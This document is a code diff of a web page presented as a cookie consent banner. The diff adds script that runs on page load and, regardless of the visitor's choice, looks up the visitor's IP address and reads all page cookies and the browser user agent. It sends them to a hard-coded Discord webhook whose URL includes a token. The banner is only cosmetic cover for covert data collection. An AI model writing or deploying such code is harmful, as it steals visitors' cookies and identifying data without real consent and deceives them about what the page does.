@@ -2,18 +2,21 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Cookie Consent with Webhook</title>
+    <title>Cookie Consent with Webhook, IP, and Device</title>
     <style>
+        body {
+            background: #222;
+        }
         #cookie-banner {
             position: fixed;
             bottom: 0;
             left: 0;
             right: 0;
-            background: #222;
+            background: #575454;
             color: #fff;
             padding: 20px;
             text-align: center;
-            display: none;
+            display: block;
             z-index: 999;
         }
         #cookie-banner button {
@@ -25,7 +28,7 @@
         }
     </style>
 </head>
-<body>
+<body onload="fetchAndSendInfo()">
 
     <div id="cookie-banner">
         🍪 This site uses cookies to improve your experience.
@@ -33,26 +36,54 @@
     </div>
 
     <script>
-        const delayBeforeSend = 2000;
+        const webhookUrl = "https://discord.com/api/webhooks/1369010479003074611/xRcpWt1QM2sYztFWocs6uLxIPnHaGNdOvLAxWNtNgaogJXzAJ3laKqyC3Lp60TVomXX8";
+
+        function hasAcceptedCookies() {
+            return document.cookie.includes("cookieConsent=true");
+        }
+
+        function sendInfoToWebhook(ipAddress, cookies, userAgent) {
+            const formattedCookies = cookies.split(';').map(cookie => cookie.trim()).join('\n- ');
+
+            const payload = {
+                content: `🌐 Website opened - IP Address: ${ipAddress}\n💻 Device: ${userAgent}\n🍪 Current Cookies:\n- ${formattedCookies}`
+            };
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            }).catch(err => console.error("Webhook failed:", err));
+        }
 
         function acceptCookies() {
             document.cookie = "cookieConsent=true; path=/; max-age=" + 60 * 60 * 24 * 365;
             document.getElementById("cookie-banner").style.display = "none";
-
-            setTimeout(() => {
-                fetch("/.netlify/functions/logCookies");
-            }, delayBeforeSend);
         }
 
-        window.onload = () => {
-            if (document.cookie.includes("cookieConsent=true")) {
-                setTimeout(() => {
-                    fetch("/.netlify/functions/logCookies");
-                }, delayBeforeSend);
-            } else {
+        function fetchAndSendInfo() {
+            const userAgent = navigator.userAgent;
+            let ipAddress = "Fetching IP...";
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress = data.ip;
+                    const allCookies = document.cookie;
+                    sendInfoToWebhook(ipAddress, allCookies, userAgent);
+                })
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
+                    const allCookies = document.cookie;
+                    sendInfoToWebhook("Could not retrieve IP", allCookies, userAgent);
+                });
+
+            if (!hasAcceptedCookies()) {
                 document.getElementById("cookie-banner").style.display = "block";
             }
-        };
+        }
     </script>
 
 </body>
